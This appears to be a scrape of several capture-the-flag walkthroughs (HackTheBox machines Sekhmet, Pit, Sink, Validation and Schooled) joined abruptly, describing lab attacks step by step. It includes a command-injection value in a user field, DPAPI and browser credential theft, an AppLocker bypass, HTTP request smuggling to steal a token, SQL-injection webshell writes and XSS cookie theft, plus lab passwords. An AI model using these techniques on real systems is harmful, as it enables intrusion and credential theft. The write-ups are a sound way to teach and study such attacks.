I am able to get it to connect to webserver. I’ll set Ray.Duncan’s mobile to $(net use \\\\webserver.windcorp.htb\\df 2>&1), and then start nc on webserver listening on 445. When the task runs, there’s a connection:
In order to get a hash from that, I’ll either need to start an SMB server on webserver, or tunnel the connection back to my host. I’ll opt for the latter.
I’ll need to enable remote tunneling in /etc/ssh/sshd_config. Otherwise, I’ll only be able to listen on local host. As root, I can do this. I’ll find this line, uncomment it, and change the no to yes:
Now I’ll restart SSH (service sshd restart) and reconnect with the additional tunnel:
-R 0.0.0.0:445:127.0.0.1:445 tells SSH to open a listening port on TCP 445 on all interfaces of webserver and forward anything that arrives through SSH to my VM on 445.
I’ll start a Python SMB server, and wait for the next script to run. When it runs, I get the authentication challenge hash:
I’ll save that into a file and crack it with hashcat:
It breaks in about 35 seconds with rockyou.txt to “!@p%i&J#iNNo1T2”.
There’s not much I can do with these creds. I’ll run kinit scriptrunner, but it doesn’t give much. I can ldapsearch to see information about scriptrunner:
It’s just a plain user. Nothing interesting. Can’t WinRM.
This is an account that is running scripts, rather than being associated with a user. It’s worth checking to see if any other users use the same password.
I’ll get a list of users with ldapsearch on webserver and save it to a file, capturing almost 600 users:
I’ll download the latest Kerbrute release and upload it to webserver with scp. Because it’s a Go binary, all dependencies are packaged with it so it will run fine on the VM. I’ll run it:
It finds both scriptrunner and Bob.Wood using that password!
ldapsearch shows that Bob.Wood is an admin user:
This makes it likely that I can WinRM as Bob.Wood.
I’ll get a ticket as Bob.Wood:
Now I’ll connect using proxychains to get into the 192.168.0.0/24 network, and -r windcorp.htb to specify the Kerberos realm to connect to. I must use the DC hostname as the “IP” for Kerberos auth to work.
user.txt (the same as before) is on Bob.Wood’s desktop.

Category: Shell as Bob.WoodADM
Despite having some administrator looking groups, Bob is not administrator on Sekhmet. There are a few other users:
One very common thing to look for on pentests is DPAPI, the Windows OS method for encrypting and storing keys and passwords. Items (known as “blobs”) are encrypted using symmetric crypto with a key generated from the password/NLTM hash and SID. I showed one way to abuse this technique before in Access.
This page from HackTricks has a really good background on it. The DPAPI blobs are stored in C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\{SID}\.  A bunch of these folders are hidden, and will now show up unless I add -force to my PowerShell gci/ls/etc command.
There is a SID in the Protect directory:
There’s a couple keys there (the 740 byte files named by a GUID):
C:\users\bob.wood\AppData\Roaming\Microsoft\Credentials is empty, so no system level keys stored here. Another thing DPAPI is used for is storing browser saved creds. And Bob.Wood has some of those in the Edge directory:
The most famous way to decrypt DPAPI is with Mimikatz. I’ll upload the latest mimikatz release to Sekhmet by hosting it on a webserver on my machine (no shown), and fetching it with irw:
However, when I try to run it, it won’t run:
This feels like AppLocker. I’ll try moving it to a classic AppLocker bypass directory, but still no:
There are a few approaches I could take here. I can try to find a way to get around AppLocker. The intended path for this box is to enumerate the AppLocker rules and notice that while most the LOLBins are blocked, there two versions of InstallUtil.exe on the box, and only one is blocked. From there, I could write a .NET binary to continue, escaping from PowerShell constrained language mode, and running the PowerShell version of Mimikatz to get the DPAPI passwords..
I’ll explore two easier paths.
The first is to download the necessary files and run the decryption offline. I thought this would be trivial, but it did end up taking much longer than I expected, as Mimikatz isn’t configured for this path, and other tools I tried weren’t working. Shoutout to szymex73 who suggested pypykatz, which is awesome!
The other way I’ll show is to find a world-writable directory that isn’t blocked by AppLocker, and run SharpChromium from there (I suspect Mimikatz would work here too, but I wanted to show off a different tool).
My initial thought was that rather than try to bypass protections, I’ll just exfil the files I need and decrypt offline. I’ll need two files from the Edge directory, Local State and Login Data.
Local State is a text JSON file in C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data, which I can copy to my clipboard and paste into a file on my VM.
Login Data is a binary file (actually a SQLite DB). PowerShell is actually in Constrained Language mode, which prevents the syntax required to base64 encode, so I’ll use certutil:
The output is quite long, but I can grab it using the TMUX techniques that IppSec shows in this video. Once I paste that back on my box, I can decode it and have the file:
Local Data is a SQLite DB, with a handful of tables:
The logins table is where passwords are saved:
The passwords are encrypted. The key to decrypt them is saved in Local State:
That key is encrypted with Microsoft DPAPI, using one of the key files I noted above. To see which one, I’ll extract the DPAPI encrypted blob, and use pypykatz:
That GUID matches one of the files in the Protect folder shown above. I could also just skip this step and try both key files.
I’ll use certutil to base64-encode that file, copy the results, paste it on my machine and decode it to get that binary file on my system.
To decrypt these logins, I’ll need to run four steps:
Step 1 is run with the prekey subcommand in pypykatz:
It generates three prekeys, which I save to a file pkf using tee.
Step 2 is to give the file with the prekeys to masterkey along with the GUID file from Protect to generate a file containing the master key:
The result is a JSON file with a master key in it.
Step 3 and step 4 are carried out with the chrome subcommand, giving it the location of the Local State and Login Data files, as well as the file with the master key:
It uses the master key to decrypt the Edge specific key in Local State, and that key to decrypt the three passwords in Login Data.
To this point, I’ve guessed that AppLocker is blocking exes at a couple points. To move forward, I need to understand what the AppLocker policy is.
I’ll pull it with Get-AppLockerPolicy:
I go over how to format this into something more readable in the second part of this video that I made when Hathor retired:
The first goal is to find a place on Sekhmet that bob.wood can write that isn’t blocked in these rules. I spent a little bit of time trying to write a command to look for writable directories, but between constrained language mode and other failures, didn’t get far.
The rules for EXEs allow that any user can run files from %WINDIR%\*, except for things that are blocked:
The block list is quite long. Looking for common directories, I stumble across this GitHub Gist which has a short list of world writable directories:
Comparing that to the blocked list in the AppLocker data, C:\windows\debug\wia isn’t blocked. I’ll try it, and I can write to it:
I’ll copy cmd.exe into this directory, and it runs:
SharpChromium is a .NET exe that will extract cookies and login data from Chrome. I’ll download a compiled version from SharpCollection and upload it to Sekhmet, and it runs:
Giving it the logins command will dump the same data as the offline strategy:
One of the saved logins is for bob.woodADM@windcorp.com on webmail.windcorp.com. That seems to be bob.wood’s admin account. Given that it’s for webmail on the domain (I’m assuming this is supposed to be .htb not .com), then it’s likely this is that user’s domain password.
I’ll run kinit to get a ticket as this user with this password, and connect over Evil-WinRM:
bob.woodADM is in the Domain Admins group:
And can read root.txt:
CTF solutions, malware analysis, home lab development














Looking at the data, a few things jump out.
The hostname is pit.htb:
I get a full process list, and while there are a few unfamiliar applications, nothing jumps out as interesting at this point. When I get to the section with the output line for the monitoring process, there’s some good information in the NET-SNMP-EXTEND-MIB:
The OS version is CentOS Linux 8.3.2011. It’s running SELinux, and there’s a user named michelle.
There’s another line that jumped out:
It’s not immediately clear to me what this is. But it’s a path that’s in the /var/www/html directory, which suggests that might be a path on the webserver.
Visiting http://dms-pit.htb/seeddms51x/seeddms/ redirects to a login page:
It claims to be a classified area. SeedDMS is a free document management system.
At this point I do have a username, michelle. After a couple guesses, the password michelle provides access:
The “Upgrade Note” is interesting:
Because of the security issues in 5.1.10, they upgraded to 5.1.15.
I’ll also note that the urls within this application end in .php.

Category: Shell as michelle
Looking at the changelog for version 5.1.11, the top issue is this one:
It sounds like the old version allowed for upload of PHP webshells. What’s surprising is the fix - “add .htaccess file”. That would probably work on Apache, but not NGINX, which this server is running.
There’s a public POC for this exploit on ExploitDB. Basically it says to upload a webshell and then find it at /data/1048576/"document_id"/1.php, where the document id is available in the file’s page once uploaded.
By hovering over the link to the CHANGELOG file, I can see it’s document_id is 21:
I took a few guesses at the file structure to see if I could find the new .htaccess file, and eventually found it in /data at http://dms-pit.htb/seeddms51x/data/.htaccess:
On Apache, this would prevent access to any file inside /data. But again, this is NGINX.
It doesn’t look like I have access to upload to the root, but I’ll start digging in folders. Once I get to /Docs/Users/, there’s two directories, Michelle and Jack:
Based on the icon’s not being grayed out, I might have some permissions on Michelle.
Clicking on that, there’s not a bunch of options at the top, including to Add document:
I’ll upload my favorite simple PHP webshell:
The document ID is 31.
That’s code execution! This file is deleted every 5-10 minutes, so I may have to upload again, and the document id will increment as well.
I tried a bunch of things to get a reverse shell, but they all failed. When I couldn’t even get curl to connect to my host, I guessed maybe a firewall, but it was still acting weird.
Looking at a nc connection back to me, it also failed:
Permission denied is interesting. I’ll look at the file:
Ignoring the fact that somehow the nc link is configured through the alternatives, the actual ncat binary has an extra . on the end of the permissions. That’s an indication the SELinux is impacting the file.
curl has it too:
I’ll use a simple Bash loop to enumerate the box through the webshell:
I’m not able to access /home:
Looking at the web directories, there’s a settings.xml for the DMS:
Inside, this line has creds:
That password doesn’t work for SSH as michelle:
It looks like key-based auth is required. But it will login as michelle via the service on TCP 9090:
The bottom option on the left side is Terminal:
Sometimes the text in the shell is all garbled:
Changing the appearance one or two times will fix that. I can copy out of the shell as well with Ctrl-Insert.
I can grab user.txt:

Category: Shell as root
As michelle, I can only see processes owned by michelle:
But I had SNMP access that gave the full process list. One of the things that was interesting was the output of the NET-SNMP-EXTEND-MIB. Some digging on that shows that it’s an extension that allows for running of specific scripts triggered by SNMP. The command for that was also given:
monitor doesn’t show up with which, but it is in /usr/bin:
Only root can run it, which is why which doesn’t identify it.
The script itself is just a Bash script that finds scripts in /usr/local/monitoring and runs them:
I can’t read in that directory, and the directory itself is only writable by root:
However, there is a + at the end of the permissions, which means there’s additional ACLs set on the directory. michelle actually can write and execute from the directory:
I’ll write a simple script to ping my VM:
The script works fine as michelle:
Now I’ll trigger it via SNMP (I can trigger just the MIB for the monitoring script so that it doesn’t take minutes to run):
There’s some kind of permission denied on ping (last two lines starting with NET-SNMP), which is weird, but feels like SELinux. It does show it tried to run the script.
I’ll try a script that will write an SSH key into root’s authorized_keys file:
I use tee and the additional echo so that the output will be visible in the SNMP output to see if it worked.
On triggering that, the output looks good:
SSH will work to connect with the matching private key as root:
And grab that flag:
I noted during solving that SeLinux was on the box, and blocking things I was trying to do. SeLinux puts a ton more granular permissions around not just file access but other kinds of access like sockets. It blocked reverse shells from the webshell. It also prevented me from using the SNMP scripts to access root.txt. For example, creating this script:
Running it results in these two lines:
And looking at the file, it’s got the . at the end of the permissions to indicate SeLinux:
Using -Z with ls will show the SeLinux context:
So root.txt falls under the admin_home_t role.
SeLinux can run in two modes - Enforce (1) and Permissive (0). getenforce will return which mode is running:
Enforcing will block specific activities, where as Permissive will just log them but let them happen.
For example, if I change the mode:
And retrigger the SNMP script to get the root flag:
Logs are created at /var/log/audit/audit.log. When I tried to read root.txt with SNMP and it was blocked, this log was created:
In permissive mode, three logs were created:
The first was exactly the same as the previous log, except permissive=1 instead of 0. Both of those were for the read syscall. The next two log in permissive mode were for the open and getattr on root.txt.
In all the logs, I can see the issue is with the snmpd_t role trying to access admin_home_t. If I pipe that log into audit2allow, it shows how to configure the system to not block this:
In this case, snmpd_t would need file read access to admin_home_t.
The reverse shell from the webshell was another thing that was blocked. In fact, any connection out to me was blocked. To demonstrate, I’l run nc over the webshell to just connect to my host:
It generates these logs:
I can feed that into audit2why to get more details about what’s going on:
The messages assume that if you are looking, it’s supposed to be working (as opposed to detecting malicious activity). Still, the details are useful. There’s a rule preventing the httpd process from making outbound connections.
Z in ps will show the same thing for processes:
nginx is in the httpd_t role. audit2why showed that this role needs some permission to connect out.
audit2allow will give you a list of things that are blocked, and what the things to allow so that none of them would be blocked. In short, if you installed SeLinux on a clean system, put it into permissive mode, ran for a short period of time, and then allowed everything, as long as your system wasn’t exploited during that time, you can get a good snapshot of what you do that’s legit.
For a suspected compromised host, you can use this to look at everything SeLinux blocked:
So it is detecting httpd_t trying to make connections, snmpd_t trying to read files, etc.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 30 Jan 2021
OS : Linux
Base Points : Insane [50]
1 : Chef Login : http://chef.sink.htb Username : chefadm Password : /6’fEGC&zEx{4]zz
2 : Dev Node URL : http://code.sink.htb Username : root Password : FaH@3L>Z3})zzfQ3
3 : Nagios URL : https://nagios.sink.htb Username : nagios_adm Password : g8<H6GK{*L.fB3C
Nmap scan:
Host is up (0.062s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
5000/tcp open  upnpCategory: Recon
nmap found three open TCP ports, SSH (22) and HTTP (3000 and 5000):
Based on the OpenSSH version, the host is likely running Ubuntu Focal 20.04.
Port 3000 is hosting an instance of Gitea, a self hosted Git service.
In the explore tab, I don’t see any repositories, but there are three users:
There’s also an organization:
Those are all worth noting, but there’s not much else I can do here without creds to login.
The response headers don’t give away much information. searchsploit did have an exploit for Gitea 1.4.0, but the page indicates this is 1.14.12.
The site at the root of port 5000 is a login page:
The link to Sign Up allows me to create an account, and then takes me to the Sink Devops page:
I am able to leave a comment at the bottom of the only post:
I can also delete it.
The Contact link along the top just points to /home, but the Notes link leads to /notes:
I can create notes, view, and delete them:
Looking at the response headers, there are two interesting ones that stand out:
The server is Gunicorn, which is commonly used to scale Python web applications. The Via header also shows haproxy. It is not uncommon to have something like HAProxy doing load balancing in front of multiple servers, and then Gunicorn managing access to the web application on each server. This post does a really nice job breaking down how different technologies fit together.
I’ll send one of the requests over to repeater in Burp and make a malformed request:
On sending this, the HAProxy response gives the version:
searchsploit didn’t return anything interesting for Gunicorn or HAProxy. Googling, I came across CVE-2020-11100, RCE in HAProxy using HTTP2, but I had a hard time finding a POC that would work here, and the bug looks very complicated.
Google also returned a blog post entitled HAProxy HTTP request smuggling (CVE-2019-18277). It’s looking at how HAProxy and Gunicorn handle the Transfer-Encoding header. This issue is where the Gunicorn development team is talking about fixing this issue, with a post on 20 Nov 2019 saying it’s been fixed. In the Gunicorn change-log, it shows the issue fixed in 20.0.1. Given that Sink is using 20.0.0, this attack should work.
This PortSwigger Article does a really good job showing how HTTP Request Smuggling works. At a high level, this attack takes advantage of a case where the front-end and back-end servers break a request differently. There are two ways to delineate an HTTP request body - the Content-Length and the Transfer-Encoding headers. The Content-Length header gives the length of the body in bytes. Transfer-Encoding: chunked says that the body is broken into one or more chunks, where a chunk starts with a hex number representing the size of the chunk, then the chunk data, and the body is terminated with a chunk of size 0.
When the front-end (like HAProxy) sends data to the back-end (like Gunicorn), it can end up in one stream, leaving the back-end to break it apart based on these headers (image from PortSwigger):
If an attacker can make the two break requests in different places, they can get their information into someone else’s request (image from PortSwigger):

Category: Shell as marcus
I’m going to craft a request that will be sent on completely by the front end, but broken into a complete request and an incomplete request by the back-end, much like the image above. The next request in will end up being the completion of my incomplete request.
The issue with this specific CVE is in how HAProxy handles the 0x0b character, which is vertical tab. When I put Transfer-Encoding: \x0bchunked, HAProxy will see that as:
Since they are on different lines, it will ignore this, and fall back to using the Content-Length header.
When the request reached GUnicorn, it will ignore the \x0b, and handle the request as chunked. This encoding method ignores the Content-Length and looks at chunks, where each chunk starts with a line with just the chunk length, and then the last chunk (or “terminating chunk”) is length 0.
For Sink, I will start with a simple GET and then the second partial request will be the headers for a POST request to create a note, and I’ll stop where the POST body content would start, including the note=. That will put the next request (up to the Content-Length) into the body of the POST, and create a note with it. As my account cookies are in the partial payload, the note will be created in my account. Hopefully I can see other user’s activity and perhaps even their cookies.
I want to send a request that looks like this:
Content-Length: 230 is the length of entire body, including second request. HAProxy will send this one as one request based on the Content-Length header. Gunicorn will break it based on the chunked encoding, returning the / page to me. Content-Length: 50 is much longer than the body I’m providing, so Gunicorn will wait for more to complete the request. I don’t want it to be too long at the start, as I want to make sure the next request completes it.
I’ll write a Python script to generate this packet. I can’t use requests or modules that create well-formed HTTP requests, so I’ll use socket. First, I’ll point it back at myself to see how the request looks:
Sending this to myself with nc listening, I can see the request:
It looks good! It’s important to note that I’m giving the second request a valid session cookie so that the results show up under my notes.
Now I’ll change the host from localhost to 10.10.10.225, and give it a run. I also found it was much more reliable if I put a time.sleep(5) in before the socket closes. After the script completes, I’ll refresh the page to see if any note show up, and there’s a new one:
The contents look like the start of another request, where someone is trying to hit the /notes/delete/1234 endpoint, and based on the partial hosts header, it looks like it’s coming from Sink:
I’ll expand the Content-Length header from 50 to 300 and see if I can capture more of a request. It works:
Now I’ve got this users JWT. Over on jwt.io, it decodes to:
I’ll use the Firefox dev console to change my cookie to the admin’s cookie, and then refresh the /notes page:
Those three notes each contain creds:
The creds from note 2 work to log into Gitea back on port 5000:
Looking around, the repository Key_Management jumped out as potentially interesting. I clicked on that, and then on Commits to see details on the nine commits:
I clicked through each of the commits, and the third commit (starting from the top at the most recent), Preparing for Prod, shows the deletion of a SSH private key by marcus:
A bit more digging shows that this key was added by marcus in the Adding EC2 Key Management Structure commit, the commit before this was removed.
The SSH private key works to get access to the box as marcus:
And I can grab user.txt:

Category: Shell as david
Other than user.txt, there’s not much in marcus’ homedir. Looking at the process list (ps auxww --forest), it’s clear that there are docker containers running. Under containerd, this looks to be the container running the web stuff, including HAProxy and Gunicorn:
And this one (also under containerd) looks like a different container that I don’t know about yet:
There are two docker-proxy instances running:
The first is forwarding port 5000 to port 8080 on the container, and listening on all interfaces. That fits with the web stuff I’ve already seen.
The other one is only listening on localhost, and connecting to 4566 on the container.
The second container is also running bin/localstack. Googling for that finds LocalStack, “A fully functional local AWS cloud stack”.
LocalStack spins up the following core Cloud APIs on your local machine.
Note: Starting with version 0.11.0, all APIs are exposed via a single edge service, which is accessible on http://localhost:4566/ by default (customizable via EDGE_PORT, see further below).
I first did an overview of AWS cloud exploitation with Bucket, and I’ve since also targeted it in Gobox.
Typing aws[tab][tab] in the shell shows the various AWS binaries on Sink:
The awslocal is the same as aws, but it always talks to localhost, so I don’t have to give it a --endpoint-url parameter with each command. The command is run with the syntax awslocal [options] <command> <subcommand> [<subcommand> ...] [parameters], and there are over 200 unique commands. I need more focus as to what to target.
Back in the Gitea instance, I looked through the three active repos. The Kinesis_ElasticSearch repo seemed to have some interaction with Lambda, the AWS serverless functions offering. The Serverless-Plugin repo defines a Docker instance that connects to localstack, but I didn’t see any clues in there.
The Key_Management repo (where I found the SSH key) has more to offer, and I’ll come back to that.
The Log_Management repo has a create_logs.php script:
Looking at the history, the original version has the key and secret:
My first instinct was to look at the cloudwatch and lambda commands. For example, awslocal lambda help gives a man page with the list of sub-commands. list-functions seemed like a good one, but it looks like that endpoint is not enabled:
The cloudwatch command seemed to have a functioning endpoint, but I couldn’t get anything to return data:
In playing around with other commands, the log command had a bunch of interesting subcommands. describe-desinations failed, but describe-log-groups returned data:
I next tried describe-log-streams, and it returns an error, saying it requires the parameter --log-group-name. I’ve got one of those from the previous query:
describe-queries, describe-query-definitions, and describe-resource-policies all returned 500. describe-subscription-filters requires a --log-group-name, and on giving it, it returned that there are none.
get-log-events requires both a --log-group-name and a --log-stream-name. At this point, I only have one of each, and it returns a handful of events:
I continued working through the logs subcommands, but didn’t find anything else useful.
The logs themselves have multiple references to secrets, and there’s one reference in the help page:
Running awslocal secretsmanager help gives a list of the commands. list-secrets jumps out as interesting.
I wasn’t sure what to do with these, but back in the help, there’s another command, get-secret-value. Running it reports that it requires --secret-id. I didn’t see ids in the output above, but looking at awslocal secretsmanager get-secret-value help, it clarifies what is needed:
It works!
Grab the other two as well:
Given that the last set of creds in the secrets manager is for david@sink.htb, and david is a user on the host, it’s worth checking to see if they work for that account. They do:

Category: Shell as root
david’s homedir has a Projects directory with only one file in it:
Neither file nor xxd offer much of a hint as to what it is:
The Key_Management repo in Gitea has a handful of scripts. For example, listkeys.php:
Just like the other stuff involving logs, this one is interacting with localstack on TCP 4566, and it’s using the Amazon Key Management System, or KMS. awslocal has a kms command:
The subcommands include list-keys which seems like a good starting place. 11 keys come back:
There’s another subcommand, describe-key, that takes --key-id:
Given that I’m looking to do some decryption, finding a key with usage ENCRYPT_DECRYPT would be useful. This one has Enabled set to false.
To check out each key, I’ll get a list using grep and cut:
I’ll loop over those, storing the description and then looking for keys that are not Disabled and printing their usage. It finds two:
I’ll use the one that’s intended for ENCRYPT_DECRYPT and try to decrypt the blob. This key supports both SHA1 and SHA256 based RSAES:
I’ll reference the file by the notation fileb://[path], and pass it into the decrypt subcommand:
It doesn’t like it. If I specify the encryption, it works:
I’ll grab the base64-encoded blob, decode it, and output it to a file on my local machine:
It’s now gzipped data. I can decompress that with zcat, which makes a tar archive:
Extracting that provides two files, and the servers.yml file is plaintext:
It contains an admin password.
That password works over SSH for root:
And I can grab root.txt:
Request smuggling was a really popular exploitation concept that I had heard about many times. SerialPwny  was regularly DMing me to talk about how he exploited it for some bug bounty. Yet I never really had a feel for how it worked. And then MrR3boot builds this beautifil that displayed the technique so clearly. I loved it.
Sink was to be released only a few weeks after I started working for HackTheBox. The challenge with Sink is that for request smuggling to work, the malicious packet needed to be followed immediately by the legit traffic to be captured. How would this work on shared instances at HackTheBox, where many hackers were trying to exploit the vulnerability at the same time, and he legit traffic was scripted to occur only periodically?
We took advantage of the fact that the vulnerable application was running in Docker, which meant we could scale it. Instead of starting one instance of the flask container, we started 16:
With 16 listening containers, we now wanted a way to load balance users across these instances. IppSec looked into a way to do it with a kernel module (which he talks about in his video for Validation), but we ended up going with a solution using IPtables. In /root/automation, there’s a rules.sh file which sets the rules on boot:
For each rule, it’s matching on a destination port of 5000. For a given IP, it will use a mask of 0.0.0.15. 15 is 1111 in binary, so it’s look at the low four bits of the source IP, and comparing that to the defined value.  So 0.0.0.4/0.0.0.15 would match on a .4, .20, .26, etc. With 16 rules, each IP is covered by only one of them. Each rule will do a NAT rewrite to forward you to one of the containers.
Effectively, this means for a given instance of sink, 1/16 of the players are targeting each container.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 Sep 2021
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.073s latency).
Not shown: 65522 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http-proxyCategory: Recon
nmap found four open TCP ports, SSH (22), and three HTTP (80, 4566, 8080):
Based on the OpenSSH version, the host is like running Ubuntu 20.04. But the Apache version shows Debian, likely Debian 10 Buster. This is a good indication there’s likely some kind of container here.
The site is another about UHC:
When I enter my username and pick a country, it shows a page:
If I register another user in the same country, they show up in the results as well:
The page acts really funny if I register the same name again in a different country, but not in anyway I see to exploit. To save myself annoyance, I just create a new username each time I submitted.
On submitting a name and country, it sends a POST to /, with the body:
The response is a 302 redirect to /account.php, which is a good indication that the site is running PHP. On logging in, there is a Set-Cookie header, and it’s interesting to note that even if I already have a cookie, on changing my username, it sets a new cookie:
Also, if I send the same username (even after a fresh reset, it returns the same cookie). Given the length of the cookie, it’s not too hard to figure out that the cookie is just the MD5 hash of the given username:
This is a bad practice. I tried creating a cookie for admin and root, but nothing interesting came up.
I’ll run feroxbuster against the site, and include -x php since I know the site is PHP:
The only new path here is config.php, but it just returns an empty page on visiting. This is likely a page that’s included by other pages.
Visiting this page just returns 403 forbidden:
This is the default port for localstack, so I can keep an eye out for any cloud-themed items.
This page returns 502 Bad Gateway:
Not much interesting here.

Category: Shell as www-data
I tried to register as 0xdf', and the site handled it without issue:
But there is another field sent in the POST request. If I kick the POST over to Burp Repeater, I can try to check for SQLi in the country. On submitting, there’s just a 302 in return:
If I use that cookie to request /account.php, there’s an error:
This is a second-order SQL injection.
I can guess that the SQL query on the page looks like:
A UNION injection is when I add a UNION statement to the query allowing me to make a new query and append the results to the intended query. I’ll need to match the same number of columns, or the query will error. I’ll start with Brazil' UNION SELECT 1;-- -. That would make the query:
I’ll need to use another user here, or I still get some weird results. I’ll submit the request, and then load the account.php page with that cookie. It worked:
That 1 at the end is the result of the union.
If I change the 1 to user(), I get the name of the user for the DB:
This results in:
This is another example where I could keep working out of Repeater, but it’s a pain, and if I’m doing enumeration for any period of time, it’s nice to have a shell. This is what I came up with:
It doesn’t do anything special except give me the ability to fill in the union ... statement with an SQL statement that returns one column and get a result quickly.
For example:
There are four DBs in this instance, but only registration is interesting as far as having data (the others are mysql internals):
There’s a single table in that DB:
It has four columns:
There’s no kind of password or anything.
I can check for what privileges my user has:
It’s a lot, but FILE jumps out as interesting.
Another thing to try is writing a file. I’ll run:
It doesn’t return anything, because if it worked, it would return 0 columns, when it’s trying to union with 1 column, which will lead to an error (after it writes the file).
The file does exist on the server:
I’ll run that again, but this time write a simple PHP webshell:
It worked:
To get a full shell, I’ll start nc on 443 and run:
It hangs, but at nc:
And upgrade the shell using the script trick:
In /home/htb I have access to user.txt:

Category: Shell as root
There’s not much on the box, but there is one file I couldn’t access before worth checking out in /var/www/html, config.php:
Any time I get creds like this, it’s worth checking them for other users. In this case, they work for root:
And I can grab root.txt:
It didn’t take much enumeration to get to root on a box called validation, and it’d be easy to stop at this point. But a bit more poking around will show that I’m not in the host system. For example, the IP address is on the 172 range, not the 10:
Looking at the listening ports, there’s only a service on 80:
In the filesystem root, there’s a .dockerenv file:
Clearly I’m in a container. But why?
One of the challenges any box creator has when they want to make a challenge is that multiple players will be hacking on it at the same time. There’s a balance between realism and competition here on how much you want the box to clean up after the users exploiting it.
For UHC, this box was live for a period of time where players from across the world would be hacking it at the same time, many competitively racing to be the first to finish.
I noticed ports 5000-5008 were filtered in my initial nmap scan. These ports are actually different Docker instances of the same exploitable webapp (I think he actually used 5000-5031). Then he has a kernel module that is re-writing incoming packets for TCP 80 based on the source IP to one of the containers, so there’s significantly fewer players interacting with each instance.
IppSec goes into details in his video (where he has access to the kernel module source that we do not):
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 03 Apr 2021
OS : FreeBSD
Base Points : Medium [30]
Nmap scan:
Host is up (0.095s latency).
Not shown: 51492 filtered ports, 14040 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlxCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and something unknown on 33060:
The host is running FreeBSD.
The site is for a school:
At the very bottom of the page, there’s contact details and the footer that container the DNS name, schooled.htb.
Visiting this domain gives the same page as visiting by IP address.
There’s a link to a teachers page as well:
This will be useful later as I compromise their various accounts.
Running FeroxBuster against the site returned a few directories, but nothing interesting:
I poked at the prettyPhoto path, but nothing jumped out.
Because the host is using at least one domain name, I’ll check for subdomains with wfuzz. Right away one jumps out:
Moodle is an onlyine course work platform, so it definitely fits the box theme.
This subdomain is in fact an instance of Moodle:
Clicking around the site, each of the courses doesn’t grant access, but requires me to log in:
I did some Googling and searchsploit for Moodle vulnerabilities, but there was a bunch of stuff, and the interesting ones were at least a few years old (like the one used in Teacher). It would be helpful to know the version of Moodle here. The Moodle GitHub page shows files that might provide a hint to the version. There’s a version.php in the root of the repo, and it exists on Schooled as well at /moodle/version.php, but just returns a blank page. Still, now I can be oriented that /moodle is the base of the git repo.
There’s a list of dependencies at /moodle/package.json:
And a /moodle/npm-shrinkwrap.json:
At /moodle/theme/upgrade.txt, there’s a changelog that gives the current version, 3.9:
Still not much to find at this point. There is a Moodle Security page. Scrolling through that does show that they are constantly patching XSS vulnerabilities, as well as SSRFs. I’ll keep an eye out for those.
At the login page, there’s a link to register:
It won’t accept any email that doesn’t come from student.schooled.htb:
I’ll add this subdomain to /etc/hosts, but it just loads the same page as the base domain.
When I update my email to 0xdf@student.schooled.htb, it accepts the submission, and takes me to a link to confirm the account. I’d guess this is typically where the link is emailed to the person registering, but that doesn’t work on HTB today.
On clicking Continue, it says my registration is confirmed, and redirects back to the page I was on, now logged in:
Of the four courses, three of them say that you can’t enroll in this course. For example, Scientific Research:
On the other hand, Mathematics offers “self enrollment”:
On logging in and looking around, the Announcements section has a couple of posts:
The Reminder for joining students says that all students need to have a MoodleNet profile:

Category: Shell as www
Any time I see a CTF machine suggest that someone will be checking things, I wonder if that’s a hint to some kind of automation, and in this case, would fit with the XSS vulnerabilities I already noticed. This security report, MSA-20-0011: Stored XSS via moodlenetprofile parameter in user profile, seems to pull all of this together (CVE-2020-25627).
On the profile page, there’s a field for MoodleNet profile:
To see if this will work, I’ll create a simple payload that attempts to load a script from my server:
I’ll start a Python HTTP server (python3 -m http.server 80), and submit that as the MoodleNet profile. Almost instantly I get a hit back form my own IP trying to fetch the script:
The script does not exist, so my webserver returns 404 (and it looks like my browser tried a second time to fetch). That’s a good sign. It indicates that the <script> block was saved into the page, and if someone else tries to look at it, they will also try to load my script.
Less than a minute later, there’s another hit, from Schooled:
I’ll write a quick JavaScript payload that will generate a GET request back to me that includes the visiting user’s cookie:
The next time Schooled requests the script, it immediately makes another request with the cookie:
In the firefox dev tools, in the Storage section, I’ll replace my MoodleSession cookie with the one I just got:
Now on visiting http://moodle.schooled.htb/moodle, I’m logged in as Manuel Phillips:
From the initial page, Manuel is a Mathematics Lecturer. There’s not too much to find. There are no messages with information. No obvious places to get RCE or upload anything that could execute.
I turned back to the Moodle Security page, and two issues before the stored XSS, there’s another one that’s interesting, Course enrolments allowed privilege escalation from teacher role into manager role (MSA-20-0009, CVE-2021-14321).
This GitHub page has some sparse details on the exploit, including a link to a blog that is no longer up, and this video on Vimeo showed the details of how to exploit it. I need to know someone who has the manager role. Back on the teachers page, Lianne Carter was listed as “Manager & English Lecturer”, so I can try her.
I’ll start by going to the Math class, and selecting Participants from the menu on the left. On that page, I’ll click the “Enrol users” button to get a form:
As I start to enter Lianne, it will autofill:
I’ll turn on intercept in Burp proxy, and click Enrol users. The resulting GET request has a ton of parameters:
I’ll want to change the userlist%5B%5D number to Manuel’s id (which I can get from his profile page url to be 24), and change roletoassign from 5 (presumably student) to 1 (manager). Then I’ll forward the request on to Schooled. When the table loads, I’ll see Manuel is now has the Manager roll:
I can look around a bit more as a Manager, but there’s nothing obvious to try. However, the video above does continue to another step, which includes having the manager (Lianne) in the class.
The other thing is that there’s some kind of scheduled task that’s resetting the class list (Manual back to teacher and removing Lianna) every minute it seems. So I’m going to want to keep this enrol request in Repeater so I can easily send it again. In fact, I can use two tabs, or just change between user ids 24 and 25, but I’ll want to add both Manuel and Lianne as manager each time.
